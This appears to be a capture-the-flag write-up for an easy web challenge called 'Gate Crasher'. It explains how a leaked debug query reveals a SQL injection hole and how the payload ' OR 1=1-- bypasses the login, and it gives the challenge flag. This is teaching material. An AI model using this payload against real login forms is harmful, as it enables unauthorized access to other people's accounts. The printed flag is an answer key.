# CTF Challenge Writeup: SQL Injection Authentication Bypass  
**Challenge Name:** Gate Crasher  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Author:** M4hd1Dbh 

---

## Challenge Description  
It echoes something back… but what exactly? Maybe there’s more behind this form than meets the eye.
                  Sometimes silence is just the system thinking... or leakin. 

**Hint:** Try to get the privilege the system offers.  

---

## Solution Walkthrough  

### Step 1: Analyzing the Login Form  
The challenge presents a simple login page with fields for `username` and `password`.  

- Attempting random credentials (`admin:password`) fails with:  
``Invalid credentials``

- A debug message reveals the SQL query structure:     
Debug: ``SELECT * FROM users WHERE username = '[user]' AND password = '[pass]'``
This indicates a **SQL Injection (SQLi)** vulnerability due to unsanitized user input.  

---

### Step 2: Crafting the SQL Injection Payload  
The goal is to bypass authentication by manipulating the SQL query.  

#### Payload:  
`' OR 1=1-- `
- `'` closes the username string

- `OR 1=1` forces the condition to always be true

- `--` comments out the rest of the query (including the password check)

Input:

    Username: ' OR 1=1--

    Password: (Leave empty or enter anything)

---

### Step 3: Exploiting the Vulnerability

After submitting the payload, the query becomes:

`SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = ''`

  since `1=1` is always true, the query returns the first user (typically admin)

  The application responds with:
    text

    Welcome admin! Flag: ghctf{SQL_1nj3ct10ns_m4st3r}

Flag Captured!